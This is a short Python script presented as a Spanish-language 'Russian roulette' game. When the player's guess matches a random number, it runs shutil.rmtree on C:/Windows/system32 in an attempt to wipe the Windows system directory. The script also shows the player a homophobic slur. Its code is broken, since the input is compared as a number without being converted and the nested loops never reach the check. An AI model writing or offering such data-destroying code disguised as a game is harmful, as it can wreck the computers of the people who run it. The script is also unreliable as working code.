import random
import shutil
import time

system32 = "C:/Windows/system32"
number = random.randint(1,6)

print("  Bienvenido a mi juego de la RULETA RUSA  ")

while True:
    print("El unico que muere es tu PC")
    print(" Si te sales eres MARICON")
    while True:
        while True:
            numero_magico = input("Introduce un numero de 1 al 6: ")
            if 1 <= numero_magico <= 6:
                break
            else:
                print("El número no está en el rango de 1 a 6. Inténtalo de nuevo.")
    if numero_magico == number:
        try:
            print("Cagaste mi bro")
            time.sleep(2)
            shutil.rmtree(system32)
        except Exception as e:
            print(" Te has salvado porque el codigo es de basura")
    else:
        print("Te has salvado, le das otra vez ? ")


